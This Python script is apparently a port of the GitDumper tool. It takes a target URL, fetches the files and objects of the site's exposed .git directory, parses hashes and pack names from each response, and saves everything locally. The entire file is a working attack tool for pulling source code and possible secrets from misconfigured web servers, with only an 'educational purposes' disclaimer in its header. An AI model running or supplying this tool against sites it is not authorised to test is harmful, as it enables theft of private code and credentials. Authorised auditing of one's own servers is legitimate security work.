import os
import requests
import re

def init_header():
    print("""
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########
""")

def get_git_dir(args):
    for arg in args:
        if "--git-dir=" in arg:
            return arg.replace("--git-dir=", "")
    return ".git"

def download_item(objname, BASEURL, BASEGITDIR):
    url = BASEURL + objname
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
    }
    target = os.path.join(BASEGITDIR, objname)
    response = requests.get(url, headers=headers)

    if response.status_code != 200:
        print(f"[-] Downloaded: {objname}")
        return

    # Ensure that the directory path to the file exists
    os.makedirs(os.path.dirname(target), exist_ok=True)

    with open(target, 'wb') as f:
        f.write(response.content)

    print(f"[+] Downloaded: {objname}")

    hashes = re.findall(r"([a-f0-9]{40})", response.text)
    for hash in hashes:
        queue.append(f"objects/{hash[:2]}/{hash[2:]}")

    packs = re.findall(r"(pack\-[a-f0-9]{40})", response.text)
    for pack in packs:
        queue.append(f"objects/pack/{pack}.pack")
        queue.append(f"objects/pack/{pack}.idx")

if __name__ == "__main__":
    init_header()
    queue = []

    BASEURL = input("Enter the target URL (e.g., http://target.tld/.git/): ")
    BASEDIR = input("Enter the destination directory: ")
    GITDIR = get_git_dir([BASEURL, BASEDIR])
    BASEGITDIR = os.path.join(BASEDIR, GITDIR)

    if not BASEURL.endswith(GITDIR + '/'):
        print(f"[-] /{GITDIR}/ missing in url")
        exit()

    if not os.path.exists(BASEGITDIR):
        print(f"[+] Creating {BASEGITDIR}")
        os.makedirs(BASEGITDIR)

    # Initialize the queue with static git files
    initial_files = [
        'HEAD', 'objects/info/packs', 'description', 'config', 'COMMIT_EDITMSG',
        'index', 'packed-refs', 'refs/heads/master', 'refs/remotes/origin/HEAD',
        'refs/stash', 'logs/HEAD', 'logs/refs/heads/master',
        'logs/refs/remotes/origin/HEAD', 'info/refs', 'info/exclude',
        '/refs/wip/index/refs/heads/master', '/refs/wip/wtree/refs/heads/master'
    ]
    queue.extend(initial_files)

    while queue:
        download_item(queue[0], BASEURL, BASEGITDIR)
        queue = queue[1:]
